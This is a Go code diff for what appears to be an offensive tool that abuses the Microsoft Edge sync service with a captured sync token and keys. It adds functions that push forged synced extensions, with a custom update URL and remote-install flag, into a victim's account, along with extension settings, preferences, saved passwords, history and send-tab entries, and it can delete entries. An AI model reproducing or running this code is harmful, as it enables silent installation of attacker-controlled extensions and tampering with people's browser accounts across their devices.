@@ -5,7 +5,10 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"net/url"
 	"regexp"
+	"strconv"
+	"strings"
 	"time"
 
 	"google.golang.org/protobuf/encoding/protowire"
@@ -36,7 +39,7 @@ func buildEncryptedEntryData(enc *syncproto.EncryptedData, typeID int32) ([]byte
 const defaultEnvDef = "ProductionEnvironmentDefinition_1784265840897"
 
 func newCommitMessage(idstring, cth string, data []byte, version int64, del bool, envdef, originatorGuid string) proto.Message {
-	t := int64(1772264613573)
+	t := time.Now().UnixMilli()
 	ver := version
 	deleted := del
 	if envdef == "" {
@@ -134,13 +137,6 @@ func GetWriteContext(msedgetoken, providedKeyName string) (keyname, envdef strin
 	return keyname, envdef, nil
 }
 
-func liveEnvDef(msedgetoken string) string {
-	if _, envdef, err := GetWriteContext(msedgetoken, "placeholder"); err == nil && envdef != "" {
-		return envdef
-	}
-	return defaultEnvDef
-}
-
 func trimProtoPrefix(b []byte) []byte {
 	if len(b) > 5 && b[0] != 10 {
 		return b[5:]
@@ -218,7 +214,7 @@ const defaultBookmarkPosition = "BdWUiUIE4nC5tR8oF/7A7FJnN7g="
 const writeCacheGuid = "XM1nwGWLXw20cLUU7N27rw=="
 
 func newBookmarkCommitMessage(guid, cth string, data, field25 []byte, version int64, del bool, envdef string) proto.Message {
-	t := int64(1772264613573)
+	t := time.Now().UnixMilli()
 	ver := version
 	deleted := del
 	folder := false
@@ -326,6 +322,261 @@ func AddSendTabSyncRequest(msedgetoken, keyname, envdef string, key, mackey []by
 	cth := ClientTagHashFor(SYNC_TYPE_SEND_TAB_TO_SELF, guid)
 	m := newCommitMessage(guid, cth, data, version, del, envdef, senderGuid)
 	fmt.Println("[*] Writing send-tab  guid=" + guid + "  sender=" + senderGuid + "  target=" + targetGuid + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+const DefaultExtensionUpdateURL = "https://edge.microsoft.com/extensionwebstorebase/v1/crx"
+
+func AddExtensionSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, extensionid, extensionversion, updateURL string, incognito, remoteInstall bool, objid string, del bool, version int) error {
+	if updateURL == "" {
+		updateURL = DefaultExtensionUpdateURL
+	}
+	cth := ClientTagHashFor(SYNC_TYPE_EXTENSIONS, extensionid)
+	if version == 0 && objid == "" {
+		if v, ok, _ := GetEntryVersion(msedgetoken, SYNC_TYPE_EXTENSIONS, cth); ok {
+			version = int(v)
+			DebugPrint("[*] Updating existing extension entry (base version " + strconv.Itoa(version) + ")")
+		}
+	}
+	enabled := true
+	disableReasons := false
+	ext := &syncproto.SyncExtension{
+		Extension: &syncproto.Extension{
+			ExtensionId:      []byte(extensionid),
+			Version:          []byte(extensionversion),
+			UpdateUrl:        []byte(updateURL),
+			Enabled:          &enabled,
+			IncognitoEnabled: &incognito,
+			RemoteInstall:    &remoteInstall,
+			DisableReasons1:  &disableReasons,
+		},
+	}
+	enc, err := encryptSpecifics(ext, key, mackey, keyname)
+	if err != nil {
+		return err
+	}
+	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_EXTENSIONS)
+	if err != nil {
+		return err
+	}
+	guid := objid
+	if guid == "" {
+		guid, _ = RandomGUID()
+	}
+	m := newCommitMessage(guid, cth, data, int64(version), del, envdef, "")
+	fmt.Println("[*] Writing extension  id=" + extensionid + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+func AddExtensionSettingsSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, extensionid, variablename, variablevalue string) error {
+	setting := &syncproto.SyncExtensionSetting{
+		Extensionsetting: &syncproto.ExtensionSetting{
+			ExtensionID: []byte(extensionid),
+			VarName:     []byte(variablename),
+			VarValue:    []byte(variablevalue),
+		},
+	}
+	enc, err := encryptSpecifics(setting, key, mackey, keyname)
+	if err != nil {
+		return err
+	}
+	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_EXTENSION_SETTINGS)
+	if err != nil {
+		return err
+	}
+	cth := ClientTagHashFor(SYNC_TYPE_EXTENSION_SETTINGS, extensionid+"/"+variablename)
+	guid, _ := RandomGUID()
+	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
+	fmt.Println("[*] Writing extension setting  ext=" + extensionid + "  name=" + variablename + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+func AddPreferenceSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, name, value string) error {
+	pref := &syncproto.SyncPreference{
+		Preference: &syncproto.Preference{
+			Name:  []byte(name),
+			Value: []byte(value),
+		},
+	}
+	enc, err := encryptSpecifics(pref, key, mackey, keyname)
+	if err != nil {
+		return err
+	}
+	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_PREFERENCE)
+	if err != nil {
+		return err
+	}
+	cth := ClientTagHashFor(SYNC_TYPE_PREFERENCE, name)
+	guid, _ := RandomGUID()
+	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
+	fmt.Println("[*] Writing preference  name=" + name + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+func passwordSignonRealm(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil || u.Scheme == "" {
+		return rawURL
+	}
+	return u.Scheme + "://" + u.Host + "/"
+}
+
+func passwordClientTag(signonRealm, username string) string {
+	encoded := strings.ReplaceAll(signonRealm, ":", "%3A")
+	return encoded + "||" + username + "||" + encoded
+}
+
+func AddPasswordSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, siteURL, username, password string) error {
+	signonRealm := passwordSignonRealm(siteURL)
+
+	sp := &syncproto.SyncPassword{
+		Field1:      1,
+		BaseUrl:     signonRealm,
+		Urlwithpath: siteURL,
+		Username:    username,
+		Password:    password,
+	}
+	encPwd, err := encryptSpecifics(sp, key, mackey, keyname)
+	if err != nil {
+		return err
+	}
+
+	falseVal := false
+	zeroVal := uint64(0)
+	container := &syncproto.SyncPasswordContainer{
+		EncryptedSyncPassword: encPwd,
+		UnencryptedData: &syncproto.UnencryptedPasswordMetadata{
+			Blacklisted:    &falseVal,
+			Datelastused:   &zeroVal,
+			Passwordissues: []byte{},
+			Type:           3,
+			Url:            []byte(signonRealm),
+		},
+	}
+	containerBytes, err := proto.Marshal(container)
+	if err != nil {
+		return err
+	}
+	encmsg := &syncproto.EncryptedProto{Field45873: containerBytes}
+	data, err := proto.Marshal(encmsg)
+	if err != nil {
+		return err
+	}
+
+	tag := passwordClientTag(signonRealm, username)
+	cth := ClientTagHashFor(SYNC_TYPE_PASSWORDS, tag)
+	guid, _ := RandomGUID()
+	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
+	fmt.Println("[*] Writing password  url=" + siteURL + "  user=" + username + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+func AddHistorySyncRequest(msedgetoken, envdef, siteURL, title, faviconURL string) error {
+	visitTime := windowsEpochMicros()
+	guid, _ := RandomGUID()
+
+	if faviconURL == "" {
+		u, err := url.Parse(siteURL)
+		if err == nil && u.Scheme != "" {
+			faviconURL = u.Scheme + "://" + u.Host + "/favicon.ico"
+		}
+	}
+
+	sh := &syncproto.SyncHistory{
+		History: &syncproto.History{
+			VisitTime:           visitTime,
+			OriginatorCacheGuid: []byte(writeCacheGuid),
+			Urlinfo: &syncproto.ArticleInfo{
+				Url:   []byte(siteURL),
+				Title: []byte(title),
+			},
+			Field4: &syncproto.Metrics{
+				Metric1: 1,
+				Metric4: 1,
+			},
+			Field8:           1,
+			RootTaskId:       visitTime,
+			TaskId:           visitTime,
+			Timestamp3:       18446744073709551615,
+			HTTPResponseCode: 200,
+			PageLanguage:     []byte("en"),
+			FaviconUrl:       []byte(faviconURL),
+		},
+	}
+	data, err := proto.Marshal(sh)
+	if err != nil {
+		return err
+	}
+
+	hostname := writeCacheGuid + "-" + siteURL
+	cth := ClientTagHashFor(SYNC_TYPE_HISTORY, siteURL+"|"+strconv.FormatInt(visitTime, 10))
+
+	t := time.Now().UnixMilli()
+	ver := int64(0)
+	deleted := false
+	if envdef == "" {
+		envdef = defaultEnvDef
+	}
+	m := &syncproto.RootMessage{
+		ClientID:                        writeCacheGuid,
+		UnknownStatic1:                  99,
+		UnknownStatic2:                  1,
+		ProductionEnvironmentDefinition: envdef,
+		ModifyRequest: &syncproto.ModifyRequest{
+			Entries: []*syncproto.Entry{
+				{
+					Idstring:            []byte(guid),
+					Mtime:               &t,
+					Ctime:               &t,
+					Version:             &ver,
+					HostnameOrEncrypted: []byte(hostname),
+					Deleted:             &deleted,
+					Data:                data,
+					ClientTagHash:       []byte(cth),
+					EdgeSyncEntity:      []byte(""),
+				},
+			},
+			CacheGuid: []byte(writeCacheGuid),
+		},
+	}
+
+	fmt.Println("[*] Writing history  url=" + siteURL + "  cth=" + cth)
+	out, err := SyncRequest(m, msedgetoken)
+	if err != nil {
+		return err
+	}
+	return handleCommitResponse(out)
+}
+
+func DeleteSyncRequest(msedgetoken, cth, objid, envdef string, version int) error {
+	emptyEnc := &syncproto.EncryptedData{CipherText: []byte{}, KeyName: []byte{}}
+	emptyMsg := &syncproto.EncryptedProto{EncryptedData: emptyEnc, Field96159: []byte{}}
+	data, err := proto.Marshal(emptyMsg)
+	if err != nil {
+		return err
+	}
+	m := newCommitMessage(objid, cth, data, int64(version), true, envdef, "")
+	fmt.Println("[*] Deleting entry  id=" + objid + "  cth=" + cth)
 	out, err := SyncRequest(m, msedgetoken)
 	if err != nil {
 		return err
